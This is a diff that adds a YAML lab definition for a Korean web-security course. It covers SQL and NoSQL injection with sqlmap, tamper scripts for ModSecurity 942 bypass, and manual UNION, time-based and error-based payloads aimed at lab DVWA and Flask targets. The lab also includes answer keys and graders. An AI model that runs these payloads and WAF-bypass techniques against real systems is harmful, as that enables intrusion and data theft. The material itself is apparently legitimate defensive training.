@@ -1,0 +1,476 @@
+lab_id: standalone-web-vuln-week04
+title: A03 Injection — SQLi 심화 (sqlmap + tamper + ModSec 942 우회)
+version: standalone-non-ai
+course: web-vuln
+week: 4
+description: |
+  OWASP A03 의 *SQLi 카테고리* hands-on 심화. sqlmap 의 4 phase + 10 tamper script
+  + ModSec CRS 942 family 의 우회 시도. DVWA + AdminConsole 의 *2 target* 의 비교.
+difficulty: hard
+duration_minutes: 200
+audience: web-vuln 4주차
+prerequisites:
+  - W03 완료 + crypto 4 영역 audit
+  - 학생 PC 의 sqlmap (1.6+) 가용
+  - 6v6 의 attacker / web / DVWA / AdminConsole 컨테이너 가동
+objectives:
+  - sqlmap 의 4 phase 인지 (detection / fingerprint / injection / dump)
+  - DVWA 의 SQLi 자동 (sqlmap --batch) + 결과 분석
+  - 10 tamper script 의 *변형 메커니즘* + ModSec 942 우회 시도
+  - AdminConsole (Python Flask) 의 NoSQL vs SQL 식별
+  - 5 변형 × 942 카운트 매트릭스
+  - 4 영역 보고서 + ATT&CK T1190 매핑
+pass_threshold: 0.7
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 MISSION — sqlmap 의 4 phase 인지 + DVWA 자동 시도
+
+      sqlmap 의 *자동 SQLi* 의 4 phase (detection → fingerprint → injection → dump)
+      DVWA 대상 으로 실행 + 각 phase 의 *결과* 분석.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **sqlmap** = SQLi 의 *de facto* 자동 도구 (2006 부터)
+      - **4 phase**:
+        1. **Detection** — parameter 의 SQLi 가능 여부 (boolean / time / error / union)
+        2. **Fingerprint** — DBMS 종류 (MySQL / PostgreSQL / MSSQL / SQLite / Oracle)
+        3. **Injection** — 실 payload 의 *유형* 결정 (UNION / BLIND / TIME-based)
+        4. **Dump** — DB / table / column / row 의 *실 데이터* 추출
+      - **--batch** = 모든 대화형 prompt 의 *자동 default* (학습 환경 만)
+      - **--risk / --level** = 0-3 / 0-5 의 *공격 정밀도* (높을 수록 *오탐 ↑ + 시간 ↑*)
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      # 1) DVWA 의 default endpoint (sqlmap 자동 detection)
+      # 단 ModSec 942 가 차단 가능 — 본 step 의 *baseline*
+      timeout 60 sqlmap -u "http://10.20.30.1/?id=1" \
+        --headers="Host: dvwa.6v6.lab" \
+        --batch --level=1 --risk=1 \
+        --threads=1 2>&1 | tail -20
+
+      echo ""
+      echo "=== ModSec 942 차단 카운트 ==="
+      docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log" 2>&1 | tail -1
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - sqlmap 의 4 phase 출력 (testing / DBMS / injectable / dump)
+      - parameter `id` 의 *vulnerable / not vulnerable* 결론
+      - ModSec 942 카운트 증가 (sqlmap 의 *수십 payload* 가 모두 매칭)
+      - DBMS 종류 (MySQL 가능성)
+
+      ## 💡 왜 이걸 하는가?
+
+      sqlmap = *침투 의 표준 도구*. 4 phase 의 *흐름* 인지 + *자동 결과 의 한계*
+      (ModSec 차단 시 false negative) 학습. 본 step 의 *baseline* 이 step 2 의
+      *tamper 우회* 의 시작.
+
+      ## 🔍 결과 해석
+
+      - **정상 (vuln)**: DBMS detected + parameter vulnerable + dump 가능
+      - **차단 (ModSec)**: `connection error` 또는 `403 Forbidden` 다수 → 다음 step 의 tamper 필요
+      - **timeout**: --threads=1 + --time-sec=1 으로 *최소 부하* 시도
+
+      ## 비정상 시 대응
+
+      - **sqlmap 미설치**: `apt install sqlmap` 또는 `pip install sqlmap`
+      - **--batch 의 hang**: `--non-interactive` 또는 `echo n | sqlmap ...`
+      - **모든 payload 403**: ModSec 강력 — step 2 의 tamper 시도
+
+      ## 실측 (2026-05-16)
+      - DVWA 응답: 302 (login 필요 — 단 sqlmap 의 detection 은 url 만 으로)
+      - sqlmap version: 1.6.4 (legacy — 1.8+ 권장)
+    hint: |
+      sqlmap --batch --level=1 --risk=1 + 4 phase 출력 + 942 카운트.
+    category: experiment
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      timeout 60 sqlmap -u "http://10.20.30.1/?id=1" \
+        --headers="Host: dvwa.6v6.lab" \
+        --batch --level=1 --risk=1 --threads=1 2>&1 | tail -20
+      docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log" 2>&1 | tail -1
+      SH
+    answer_detail: sqlmap 4 phase + DVWA + 942 카운트
+    verify:
+      type: output_contains
+      expect: 'sqlmap\|DBMS\|injection'
+      field: stdout
+      semantic:
+        intent: sqlmap 자동 SQLi
+        success_criteria: [4 phase 출력 + 942 카운트]
+        acceptable_methods:
+          - "**[OSS] sqlmap --batch --level --risk**"
+          - "**[OSS] sqlmap --tamper 의 우회**"
+          - "**[OSS] sqlmap --dbms=mysql 의 fingerprint hint**"
+          - "**[OSS] sqlmap --random-agent 의 UA 변경**"
+          - "**[OSS] sqlmap --time-sec 의 blind 의 time threshold**"
+          - "**[OSS] CWE-89 SQL Injection**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION — 5 tamper script × ModSec 942 우회 매트릭스
+
+      sqlmap 의 *5 tamper script* (space2comment / randomcase / between / charunicodeescape
+      / apostrophenullencode) 각 의 *942 우회 가능 여부* + sqlmap 결론 매트릭스.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **tamper script** = sqlmap 의 *payload 변형* — *동일 의도* 의 *다른 형식*
+      - **--tamper=a,b,c** = *복수 tamper* 의 chained 적용
+      - **5 대표 tamper**:
+        - `space2comment` = space → `/**/` (comment)
+        - `randomcase` = SELECT → SeLeCt (regex `(?i)` 누락 우회)
+        - `between` = `=` → `BETWEEN` (operator 우회)
+        - `charunicodeescape` = char → unicode escape
+        - `apostrophenullencode` = `'` → `%00%27`
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+
+      for tamper in space2comment randomcase between charunicodeescape apostrophenullencode; do
+        echo "=== tamper: $tamper ==="
+        timeout 30 sqlmap -u "http://10.20.30.1/?id=1" \
+          --headers="Host: dvwa.6v6.lab" \
+          --tamper=$tamper \
+          --batch --level=1 --risk=1 --threads=1 2>&1 | tail -3
+        echo ""
+      done
+
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      echo "942 차단 증가: $((AFTER - BEFORE))"
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - 5 tamper 각 의 sqlmap 결론 (vulnerable / not vulnerable)
+      - 942 차단 카운트 증가 = 5 × N (N = tamper 별 payload 수)
+      - 어떤 tamper 가 *우회 가능* 인지 식별
+
+      ## 💡 왜 이걸 하는가?
+
+      WAF (ModSec) 의 *룰 의 한계* — *정규식 기반* 차단 의 *변형 우회* 가능. *5
+      tamper* 의 *각 메커니즘* 인지 → custom tamper 작성 의 기반.
+
+      ## 🔍 결과 해석
+
+      - **정상 (vuln WAF)**: 일부 tamper 가 *우회* — 즉시 *paranoia 상승* 또는 *libinjection*
+      - **모두 차단 (강력 WAF)**: paranoia 1 의 *충분* — 단 *paranoia 2-3* 의 *false positive trade-off*
+      - **942 카운트 증가 X**: ModSec 비활성 또는 audit log 비활성
+
+      ## 비정상 시 대응
+
+      - **tamper 미인식**: sqlmap version 확인 (1.6+ 필요)
+      - **모든 tamper 같은 결과**: --level 2-3 + --risk 2-3 으로 *더 적극 시도*
+    hint: |
+      5 tamper × sqlmap + 942 카운트 증가 매트릭스.
+    category: bypass
+    points: 30
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      for tamper in space2comment randomcase between charunicodeescape apostrophenullencode; do
+        echo "=== tamper: $tamper ==="
+        timeout 30 sqlmap -u "http://10.20.30.1/?id=1" --headers="Host: dvwa.6v6.lab" --tamper=$tamper --batch --level=1 --risk=1 --threads=1 2>&1 | tail -3
+      done
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      echo "942 증가: $((AFTER - BEFORE))"
+      SH
+    answer_detail: 5 tamper × 942 매트릭스
+    verify:
+      type: output_contains
+      expect: 'tamper\|942'
+      field: stdout
+      semantic:
+        intent: tamper × WAF 우회
+        success_criteria: [5 tamper 결론 + 942 증가]
+        acceptable_methods:
+          - "**[OSS] sqlmap --tamper chained (a,b,c)**"
+          - "**[OSS] custom tamper Python script**"
+          - "**[OSS] ModSec libinjection 의 token 분석**"
+          - "**[OSS] paranoia 1-4 의 trade-off**"
+          - "**[OSS] CWE-89 + WAF bypass**"
+    target_vm: attacker
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION — AdminConsole (Python Flask) 의 NoSQL vs SQL 식별
+
+      AdminConsole = Python Flask. *SQL 또는 NoSQL* 의 식별. sqlmap 의 *NoSQL 비지원*
+      → NoSQL 발견 시 *수동 payload* (NoSQLMap 또는 직접 작성).
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **NoSQL injection** = MongoDB / CouchDB / Redis 등 의 *injection*. SQL 과 *문법
+        다름*
+      - **MongoDB injection 표준 payload** = `{"$ne": null}` / `{"$gt": ""}` / `{"$where": "1==1"}`
+      - **Python Flask + SQLAlchemy** = SQL ORM — SQLi 가능
+      - **Python Flask + pymongo** = NoSQL — sqlmap 비지원
+      - **NoSQLMap** = NoSQL 전용 도구 (codingo/NoSQLMap)
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      # 1) AdminConsole 의 server header (Flask 확인)
+      curl -sI -H 'Host: admin.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'server|x-' | head -5
+
+      # 2) 일반 SQLi payload (SQL 가능성)
+      for p in "1' OR '1'='1" "1' OR 1=1--" "admin'--"; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' \
+          "http://10.20.30.1/login?username=$p&password=test")
+        echo "SQL '$p': $code"
+      done
+
+      # 3) NoSQL payload (Mongo 가능성)
+      for p in '{"$ne":null}' '{"$gt":""}' '{"$where":"1==1"}'; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' \
+          -X POST -H 'Content-Type: application/json' \
+          -d "{\"username\":$p,\"password\":\"test\"}" \
+          http://10.20.30.1/api/login)
+        echo "NoSQL $p: $code"
+      done
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - server header: Werkzeug/Python (Flask 확정)
+      - SQL payload 응답 (200 = vuln / 400 = parse error / 401 = 정상 거부)
+      - NoSQL payload 응답 (200 = MongoDB vuln 가능성)
+      - 어느 *DB type* 인지 결론
+
+      ## 💡 왜 이걸 하는가?
+
+      sqlmap 의 *한계* = *SQL 만*. modern stack (MongoDB / Redis / GraphQL) 의 *별
+      도구* 필요. 본 step 의 *식별* 가 *공격 도구 선택* 의 시작.
+
+      ## 🔍 결과 해석
+
+      - **SQL vuln** (200 응답): SQLAlchemy 또는 raw SQL — sqlmap 추가 시도
+      - **NoSQL vuln** (200 with $ne): MongoDB — NoSQLMap 권장
+      - **모두 401/400**: 정상 거부 — input validation 적용
+
+      ## 비정상 시 대응
+
+      - **AdminConsole 의 endpoint 다름**: `/login` 또는 `/api/login` 또는 `/auth/login`
+        시도
+      - **POST 의 body 형식 다름**: `Content-Type: application/x-www-form-urlencoded` 시도
+
+      ## 실측 (2026-05-16)
+      - AdminConsole server: Werkzeug/3.1.8 Python/3.11.15 (Flask 확정)
+    hint: |
+      SQL vs NoSQL payload × AdminConsole + server header 분석.
+    category: analysis
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      curl -sI -H 'Host: admin.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'server|x-' | head -5
+      for p in "1' OR '1'='1" "1' OR 1=1--" "admin'--"; do
+        echo "SQL '$p': $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' "http://10.20.30.1/login?username=$p&password=test")"
+      done
+      for p in '{"$ne":null}' '{"$gt":""}' '{"$where":"1==1"}'; do
+        echo "NoSQL $p: $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' -X POST -H 'Content-Type: application/json' -d "{\"username\":$p,\"password\":\"test\"}" http://10.20.30.1/api/login)"
+      done
+      SH
+    answer_detail: AdminConsole SQL vs NoSQL 식별
+    verify:
+      type: output_contains
+      expect: 'SQL\|NoSQL\|Werkzeug'
+      field: stdout
+      semantic:
+        intent: DB type 식별
+        success_criteria: [server header + SQL + NoSQL 응답]
+        acceptable_methods:
+          - "**[OSS] server header 의 framework 식별**"
+          - "**[OSS] payload 별 응답 코드 매트릭스**"
+          - "**[OSS] NoSQLMap 의 MongoDB 자동**"
+          - "**[OSS] BurpSuite Intruder 의 payload set**"
+          - "**[OSS] CWE-943 NoSQL Injection**"
+    target_vm: attacker
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION — 5 SQL payload × ModSec 942 카운트 매트릭스 (수동)
+
+      sqlmap 외 의 *수동 5 payload* (UNION / OR 1=1 / sleep / boolean / error-based)
+      각 의 ModSec 942 카운트 + 응답 매트릭스.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **5 SQLi 카테고리**:
+        - **UNION-based** = `UNION SELECT 1,2,3 FROM users--`
+        - **Boolean-based** = `1 AND 1=1` vs `1 AND 1=2` 응답 차이
+        - **Error-based** = `' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--`
+        - **Time-based (BLIND)** = `1 AND SLEEP(5)--`
+        - **OR 1=1** = `' OR '1'='1` (classic)
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+
+      payloads=(
+        "1' OR '1'='1"
+        "1 UNION SELECT 1,2,3,4,5 FROM users--"
+        "1' AND 1=1--"
+        "1' AND SLEEP(2)--"
+        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--"
+      )
+      labels=(OR_1eq1 UNION boolean time_BLIND error_based)
+
+      for i in "${!payloads[@]}"; do
+        p="${payloads[$i]}"
+        l="${labels[$i]}"
+        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
+        code=$(curl -s -o /dev/null -w '%{http_code}' \
+          -H 'Host: dvwa.6v6.lab' \
+          "http://10.20.30.1/?id=$encoded")
+        echo "$l: $code | $p"
+      done
+
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      echo "942 증가: $((AFTER - BEFORE))"
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - 5 payload 각 의 응답 코드 (403 = 차단 / 200 = 통과 / 500 = error)
+      - 942 차단 카운트 증가 = 5+ (각 payload 1+ 매칭)
+      - *어떤 카테고리* 가 차단 / 통과 인지 식별
+
+      ## 💡 왜 이걸 하는가?
+
+      sqlmap 의 *자동* 외 *수동 payload* 의 *직접 분석*. WAF audit 의 *5 카테고리
+      cover* 가 *quality 보장*.
+
+      ## 🔍 결과 해석
+
+      - **모두 403 (강력 WAF)**: ModSec 의 5 카테고리 모두 차단 — 정상
+      - **일부 200**: 우회 가능 — 즉시 *paranoia 상승*
+      - **942 증가 X**: ModSec 비활성
+
+      ## 비정상 시 대응
+
+      - **URL encoding 오류**: payload 의 *공백 + 특수문자* 정확 encoding
+      - **모든 payload 200**: DVWA 의 *parameter id* path 다름 — `/page=...` 또는 `/q=...` 시도
+    hint: |
+      5 SQL payload 카테고리 (UNION/Boolean/Error/Time/OR_1=1) × 응답 + 942.
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      for p in "1' OR '1'='1" "1 UNION SELECT 1,2,3--" "1' AND SLEEP(2)--"; do
+        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
+        echo "$p: $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.6v6.lab' "http://10.20.30.1/?id=$encoded")"
+      done
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      echo "942 증가: $((AFTER - BEFORE))"
+      SH
+    answer_detail: 5 수동 SQLi 매트릭스 + 942 카운트
+    verify:
+      type: output_contains
+      expect: 'OR\|UNION\|942'
+      field: stdout
+      semantic:
+        intent: 5 SQLi 카테고리
+        success_criteria: [5 payload 응답 + 942 증가]
+        acceptable_methods:
+          - "**[OSS] UNION-based 의 SELECT column 수 결정**"
+          - "**[OSS] Boolean-based 의 응답 size 차이**"
+          - "**[OSS] Error-based 의 EXTRACTVALUE / UPDATEXML**"
+          - "**[OSS] Time-based 의 SLEEP / WAITFOR**"
+          - "**[OSS] CWE-89 + CWE-915 Improperly Controlled Modification**"
+    target_vm: attacker
+
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION — W04 종합 보고서 (sqlmap + tamper + NoSQL + 수동 5 payload)
+
+      W04 의 step 1-4 종합 보고서. 4 finding (sqlmap baseline + 5 tamper + AdminConsole
+      DB 식별 + 수동 5 payload) + CVSS + CWE + ATT&CK T1190 매핑.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **W02 의 4 섹션 형식** 재사용 (Executive / Findings / Remediation / 매핑)
+      - **ATT&CK T1190** = Initial Access > Exploit Public-Facing Application
+      - **CWE-89 + CWE-943** = SQL + NoSQL Injection
+
+      ## 💻 산출물 (W02/W03 의 4 섹션 형식)
+
+      ```markdown
+      # W04 — A03 SQLi 심화 분석 보고서
+
+      ## 1. Executive Summary
+      - target: DVWA + AdminConsole + ModSec (6v6 학습 환경)
+      - 발견 vuln 4 영역
+      - CVSS Critical / High 분포
+      - 권장: ModSec paranoia 검토 + AdminConsole input validation
+
+      ## 2. Detailed Findings
+      ### F1 sqlmap baseline (DVWA)
+      ### F2 5 tamper × 942 매트릭스
+      ### F3 AdminConsole DB 식별 (Flask + SQL/NoSQL)
+      ### F4 수동 5 payload 매트릭스
+
+      ## 3. Remediation
+      ### F1-F2 ModSec
+      - 즉시: paranoia 1 → 2 검토 (false positive trade-off)
+      - 단기: libinjection 활성 (libinjection vs regex)
+      ### F3 AdminConsole
+      - 즉시: input validation (sanitize / parameterized query)
+      - 단기: SQLAlchemy / pymongo 의 *최신* 사용
+
+      ## 4. 매핑
+      | F | ATT&CK | CVSS | CWE |
+      | F1 | T1190 | 9.8 (C) | CWE-89 |
+      | F2 | T1190 | 8.5 (H) | CWE-89 + WAF bypass |
+      | F3 | T1190 | 8.0 (H) | CWE-89 또는 CWE-943 |
+      | F4 | T1190 | 8.5 (H) | CWE-89 |
+      ```
+
+      ## 📋 확인 사항
+
+      - 4 섹션 + 4 finding 의 각 reproduction + 영향
+      - 매핑 표 (4 finding × 3 표준)
+      - ModSec 권장 (paranoia + libinjection)
+
+      ## 💡 왜 이걸 하는가?
+
+      A03 의 *침투 측 + 방어 측* 의 *통합 보고*. sqlmap 의 *자동* + 수동 payload 의
+      *cover* + WAF audit 의 *3 축*.
+    hint: |
+      4 finding × 4 섹션 + CVSS + CWE + ATT&CK T1190.
+    category: synthesis
+    points: 15
+    answer: 위 4 섹션 형식
+    answer_detail: W04 종합 보고서
+    verify:
+      type: output_contains
+      expect: 'CWE-89\|T1190'
+      field: stdout
+      semantic:
+        intent: W04 종합
+        success_criteria: [4 finding + 매핑]
+        acceptable_methods:
+          - "**[관리적] PTES 보고서 4 섹션**"
+          - "**[관리적] CWE-89 / CWE-943 매핑**"
+          - "**[관리적] T1190 Initial Access**"
+          - "**[관리적] OWASP A03 의 14 권장**"
+          - "**[관리적] ModSec paranoia 의 trade-off**"
+    target_vm: bastion
